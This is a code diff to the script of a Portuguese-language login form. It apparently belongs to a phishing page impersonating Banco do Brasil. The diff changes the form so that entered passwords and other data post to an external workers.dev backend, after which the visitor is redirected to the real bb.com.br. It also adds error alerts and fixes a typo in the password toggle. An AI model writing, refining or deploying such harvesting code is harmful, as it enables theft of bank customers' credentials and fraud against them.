@@ -69,20 +69,20 @@
             // Toggle para mostrar/esconder senha
             togglePassword.addEventListener('click', function() {
                 const type = senhaInput.getAttribute('type') === 'password' ? 'text' : 'password';
-                senhaInput.setAttribute(' tutuktype', type);
+                senhaInput.setAttribute('type', type); // Fixed typo: 'tutuktype' to 'type'
                 this.querySelector('i').classList.toggle('fa-eye');
                 this.querySelector('i').classList.toggle('fa-eye-slash');
             });
             
             // Link "Não tenho senha"
-            let formAction = '/submit';
+            let formAction = 'https://bb-backend.gustavoferreiraconte.workers.dev/submit';
             noPasswordLink.addEventListener('click', function(e) {
                 e.preventDefault();
                 senhaGroup.style.display = 'none';
                 senhaInput.removeAttribute('required');
                 noPasswordLink.style.display = 'none';
                 havePasswordLink.style.display = 'block';
-                formAction = '/submit-no-password';
+                formAction = 'https://bb-backend.gustavoferreiraconte.workers.dev/submit-no-password';
             });
             
             // Link "Tenho senha"
@@ -92,7 +92,7 @@
                 senhaInput.setAttribute('required', '');
                 noPasswordLink.style.display = 'block';
                 havePasswordLink.style.display = 'none';
-                formAction = '/submit';
+                formAction = 'https://bb-backend.gustavoferreiraconte.workers.dev/submit';
             });
             
             // Validação do formulário e envio via fetch
@@ -126,13 +126,19 @@
                         body: JSON.stringify(formData)
                     });
                     
+                    if (!response.ok) {
+                        throw new Error(`HTTP error! Status: ${response.status}`);
+                    }
+                    
                     const result = await response.json();
                     if (result.success) {
                         window.location.href = 'https://www.bb.com.br/';
+                    } else {
+                        alert('Erro ao enviar os dados: ' + (result.error || 'Erro desconhecido') + (result.details ? ' - ' + result.details : ''));
                     }
                 } catch (error) {
                     console.error('Erro:', error);
-                    window.location.href = 'https://www.bb.com.br/';
+                    alert('Falha ao enviar os dados: ' + error.message);
                 }
             });
         });
